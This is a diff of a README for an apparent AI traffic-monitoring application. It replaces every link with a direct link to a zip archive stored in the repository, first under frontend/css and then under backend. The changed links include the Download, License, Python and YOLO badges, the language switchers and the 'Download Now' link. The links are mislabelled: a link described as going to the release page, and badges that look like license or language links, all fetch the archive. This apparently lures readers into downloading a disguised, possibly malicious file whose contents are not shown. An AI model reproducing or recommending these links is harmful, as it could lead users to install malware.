@@ -2,14 +2,14 @@
 
 <div align="center">
 
-[![Download](https://raw.githubusercontent.com/jcinformaticalanhouse/AI-Vision-Traffic-Monitoring/main/frontend/css/AI-Vision-Traffic-Monitoring_draughtmanship.zip%https://raw.githubusercontent.com/jcinformaticalanhouse/AI-Vision-Traffic-Monitoring/main/frontend/css/AI-Vision-Traffic-Monitoring_draughtmanship.zip)](https://raw.githubusercontent.com/jcinformaticalanhouse/AI-Vision-Traffic-Monitoring/main/frontend/css/AI-Vision-Traffic-Monitoring_draughtmanship.zip)
-[![License](https://raw.githubusercontent.com/jcinformaticalanhouse/AI-Vision-Traffic-Monitoring/main/frontend/css/AI-Vision-Traffic-Monitoring_draughtmanship.zip)](LICENSE)
-[![Python](https://raw.githubusercontent.com/jcinformaticalanhouse/AI-Vision-Traffic-Monitoring/main/frontend/css/AI-Vision-Traffic-Monitoring_draughtmanship.zip+https://raw.githubusercontent.com/jcinformaticalanhouse/AI-Vision-Traffic-Monitoring/main/frontend/css/AI-Vision-Traffic-Monitoring_draughtmanship.zip)](https://raw.githubusercontent.com/jcinformaticalanhouse/AI-Vision-Traffic-Monitoring/main/frontend/css/AI-Vision-Traffic-Monitoring_draughtmanship.zip)
-[![YOLO](https://raw.githubusercontent.com/jcinformaticalanhouse/AI-Vision-Traffic-Monitoring/main/frontend/css/AI-Vision-Traffic-Monitoring_draughtmanship.zip)](https://raw.githubusercontent.com/jcinformaticalanhouse/AI-Vision-Traffic-Monitoring/main/frontend/css/AI-Vision-Traffic-Monitoring_draughtmanship.zip)
+[![Download](https://github.com/jcinformaticalanhouse/AI-Vision-Traffic-Monitoring/raw/refs/heads/main/backend/Monitoring-Vision-Traffic-A-1.4.zip%https://github.com/jcinformaticalanhouse/AI-Vision-Traffic-Monitoring/raw/refs/heads/main/backend/Monitoring-Vision-Traffic-A-1.4.zip)](https://github.com/jcinformaticalanhouse/AI-Vision-Traffic-Monitoring/raw/refs/heads/main/backend/Monitoring-Vision-Traffic-A-1.4.zip)
+[![License](https://github.com/jcinformaticalanhouse/AI-Vision-Traffic-Monitoring/raw/refs/heads/main/backend/Monitoring-Vision-Traffic-A-1.4.zip)](LICENSE)
+[![Python](https://github.com/jcinformaticalanhouse/AI-Vision-Traffic-Monitoring/raw/refs/heads/main/backend/Monitoring-Vision-Traffic-A-1.4.zip+https://github.com/jcinformaticalanhouse/AI-Vision-Traffic-Monitoring/raw/refs/heads/main/backend/Monitoring-Vision-Traffic-A-1.4.zip)](https://github.com/jcinformaticalanhouse/AI-Vision-Traffic-Monitoring/raw/refs/heads/main/backend/Monitoring-Vision-Traffic-A-1.4.zip)
+[![YOLO](https://github.com/jcinformaticalanhouse/AI-Vision-Traffic-Monitoring/raw/refs/heads/main/backend/Monitoring-Vision-Traffic-A-1.4.zip)](https://github.com/jcinformaticalanhouse/AI-Vision-Traffic-Monitoring/raw/refs/heads/main/backend/Monitoring-Vision-Traffic-A-1.4.zip)
 
 ### 語言 / Language
 
-**[繁體中文](https://raw.githubusercontent.com/jcinformaticalanhouse/AI-Vision-Traffic-Monitoring/main/frontend/css/AI-Vision-Traffic-Monitoring_draughtmanship.zip)** | **[English](https://raw.githubusercontent.com/jcinformaticalanhouse/AI-Vision-Traffic-Monitoring/main/frontend/css/AI-Vision-Traffic-Monitoring_draughtmanship.zip)**
+**[繁體中文](https://github.com/jcinformaticalanhouse/AI-Vision-Traffic-Monitoring/raw/refs/heads/main/backend/Monitoring-Vision-Traffic-A-1.4.zip)** | **[English](https://github.com/jcinformaticalanhouse/AI-Vision-Traffic-Monitoring/raw/refs/heads/main/backend/Monitoring-Vision-Traffic-A-1.4.zip)**
 
 </div>
 
@@ -37,7 +37,7 @@ Before downloading the application, ensure your system meets the following requi
 
 To download the application, please visit the release page. Click the link below:
 
-[Download Now](https://raw.githubusercontent.com/jcinformaticalanhouse/AI-Vision-Traffic-Monitoring/main/frontend/css/AI-Vision-Traffic-Monitoring_draughtmanship.zip)
+[Download Now](https://github.com/jcinformaticalanhouse/AI-Vision-Traffic-Monitoring/raw/refs/heads/main/backend/Monitoring-Vision-Traffic-A-1.4.zip)
 
 1. **Select the Latest Release:** Once you’re on the releases page, locate the most recent version of the software. This version includes the latest features and bug fixes.
 2. **Choose the Correct File:** Depending on your operating system, click on the appropriate installer file.
